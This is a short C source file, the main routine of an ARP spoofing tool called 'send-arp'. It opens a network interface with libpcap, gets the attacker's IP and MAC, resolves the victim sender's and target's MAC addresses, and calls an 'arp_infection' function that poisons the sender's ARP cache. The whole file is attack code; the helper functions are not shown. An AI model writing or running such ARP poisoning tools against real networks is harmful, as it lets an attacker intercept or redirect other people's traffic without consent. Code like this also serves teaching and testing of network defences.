#include "send-arp.h"

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char *const a_ip = get_attacker_ip(dev);
	char *const a_mac = get_attacker_mac(dev);

	char *const s_mac = get_mac_by_arp(handle, a_mac, a_ip, argv[2], SENDER);
	char *const t_mac = get_mac_by_arp(handle, a_mac, a_ip, argv[3], TARGET);

	arp_infection(handle, s_mac, argv[2], argv[3], a_mac);

	show_info(argv[2], s_mac, argv[3], t_mac, a_ip, a_mac);

	pcap_close(handle);
}
